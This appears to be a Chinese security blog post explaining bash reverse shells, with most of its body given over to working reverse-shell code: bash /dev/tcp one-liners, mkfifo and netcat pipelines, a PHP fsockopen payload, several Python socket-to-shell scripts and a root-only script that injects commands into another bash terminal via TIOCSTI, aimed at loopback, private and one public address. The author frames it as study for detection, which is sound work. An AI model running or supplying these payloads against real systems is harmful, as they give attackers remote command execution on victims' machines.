---
title: 深入挖掘bash反弹shell背后的密码
url: 761.html
id: 761
password: a3k57NZ2HCZLYu8NuS4G
categories:
  - 学习记录
date: 2019-01-10 16:16:34
tags:
  - ctf
  - php
  - web
  - binary
---

## 前言

接触过安全的人都知道怎么反弹shell，而且反弹shell的形式多样，方法众多。如此显而易见的东西，真的有必要写篇文章再来详细来解释一下吗？

那好，先来看几个问题吧：

1. bash运行`exec 0</dev/tcp/tcp/127.0.0.1/2222 1>&0 2>&0` 可以成功反弹shell吗？
2. bash运行`exec bash 0</dev/tcp/tcp/127.0.0.1/2222 1>&0 2>&0` 可以成功反弹shell吗？跟1的区别是什么？
3. bash运行`0</dev/tcp/39.107.104.226/2222 1>&0 2>&0` 可以成功反弹shell吗？为什么？
4. php执行 `system("/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1")` 一定可以反弹shell吗？

如果以上问题无法正确的回答出来，那我觉得了解细节还是非常有必要的，本文主要来分享我在学习和思考反弹shell的检测和拦截过程方法中遇到的问题和这些问题之后背后隐藏的细节。本文核心只关注bash的反弹shell，不关注脚本和第三方程序。

<!-- more -->

## 反弹shell综述

反弹shell从本质上来讲只有一类，那就是**劫持命令的输入和输出**。从劫持的对象不同和劫持方法的不同，大概可以将目前见到的反弹shell可以进行如下分类。
(下图是我本人一个分类，非权威，如果有不妥或者错误，请和我交流指正。)

![](https://pic.wonderkun.cc//uploads/note/202110091114665.png)

这样看起来还是有点抽象，我们依次举一些例子吧：

### 直接劫持子程序的输入输出(体验不好)

```python
#coding:utf-8
import subprocess
import socket
import shlex

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",2020))

while True:
    cmd = s.recv(1024).decode().strip()
    print(cmd)
    cmd = shlex.split(cmd)

    process = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,bufsize=0)
    out = process.communicate()
    # print(out)
    s.sendall(out[0])
```
其实重定向，管道符这些功能都是壳程序提供给我们的，这个反弹shell没有用到壳程序，所以没有 |、&、> 供我们用，体验很差。

### 劫持已有壳程序的输入输出

```bash
exec 0</dev/tcp/tcp/127.0.0.1/2222 1>&0 2>&0
```

就这么简单。
当然还有复杂的，但是需要root权限，功能还不太完善，我先给个代码示例吧。

```python
import fcntl, sys, termios
import os
import socket as sk
import threading
import time

def getBashPid():
    r = os.popen("pidof bash")
    pids = r.read().split()
    assert(len(pids) > 0) 
    return pids[0]

# tty_path = sys.argv[1]
pid = getBashPid()
tty_path = "/proc/{}/fd/0".format(pid)
s=sk.socket(sk.AF_INET,sk.SOCK_STREAM)
s.connect(("127.0.0.1",2020))
# os.dup2(s.fileno(),1)
tty_fd = open(tty_path, 'wb')
selfPid = os.getpid()

print("[*] The pid of the process is {}.".format(pid))

while True:
    a = s.recv(1024)
    if a:
    # a = b"\n" + a
        a = a.decode("utf-8")
        a = a.strip("\n") + " > /tmp/log \n"  # https://man7.org/linux/man-pages/man4/tty_ioctl.4.html 
        # 肯定有办法劫持输出，这个样觉得是不太合理的
        print(a)
        print(tty_path)
        # for line in ["ls -al\n"]:
        for byte in a:
        # for i in a:
        # byte = 
            fcntl.ioctl(tty_fd, termios.TIOCSTI,byte)
        
        time.sleep(1)
        with open("/tmp/log",'rb') as fileH:
            content = fileH.read()
            s.sendall(content)
    else:
        time.sleep(0.1)
tty_fd.close()
```

### 自己就是壳程序，劫持自己的输入和输出

其实这个想讲的是自己实现一个壳程序，然后把自己的输入输出都重定向到socket。实现一个简单壳程序其实没那么复杂，大概的思路是接收到一个命令之后，执行如下步骤：

1. fork
2. 在子程序中处理重定向和管道的问题
3. execve传过来的命令

但是想把这个壳程序写的好用，那就很难了。由于代码比较长，我就不贴了。感兴趣的google一下，有个帖子教写壳程序讲的很详细。

### 通过文件描述符绑定的方式劫持

这个估计是最常见的了，就简单说几个例子吧：
1. bash 

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
2. php 

```php
'$sock=fsockopen("127.0.0.1",2020);exec("/bin/sh -i <&3 >&3 2>&3");'
# 不一定是3,如果是webserver的话，一般是4或者更大。 
```
3. python

```python
#coding:utf-8 

import io
import subprocess
import os as so
import socket
import threading

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",2020))
process = subprocess.Popen(['/bin/bash'], shell=True, stdin=s, stdout=s,stderr=s,bufsize=0)
```

### 使用匿名/命令管道劫持

1. bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

nc 39.107.104.226 2333 | /bin/bash | nc 39.107.104.226 2334 
```
2. python

```python
import subprocess
import os as so
import socket
import threading

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",2020))

process = subprocess.Popen(['/bin/bash'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,bufsize=0)

# so.dup2(s.fileno(),process.stdout.fileno())

def copy(socket,process):
    while True:
        if process.stdout.readable():
            data = process.stdout.read(1)
        # print(dir(process.stdout))
        # if data:
            socket.send(data)
copyWork = threading.Thread(target=copy,args=(s,process))
copyWork.setDaemon(True)
copyWork.start()

while True:
    data = s.recv(1024)
    process.stdin.write(data)
```

### 使用临时文件/内存文件进行劫持

```bash
mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc attackerip listenport 1>/tmp/backpipe
```

## 


## 简单的原理了解

```bash
exec /bin/sh 0</dev/tcp/127.0.0.1/2222 1>&0 2>&0
/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1
exec 0</dev/tcp/127.0.0.1/2222 1>&0 2>&0

/bin/bash -i > /dev/tcp/10.10.10.11/443 0<& 2>&1
exec 5<>/dev/tcp/10.10.10.11/443;cat <&5 | while read line; do $line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/10.10.10.11/443; sh <&196 >&196 2>&196

0</dev/tcp/39.107.104.226/2222 1>&0 2>&0 # 为啥不行
```

## 参考链接

1. https://xz.aliyun.com/t/2548
2. https://xz.aliyun.com/t/2549

https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/
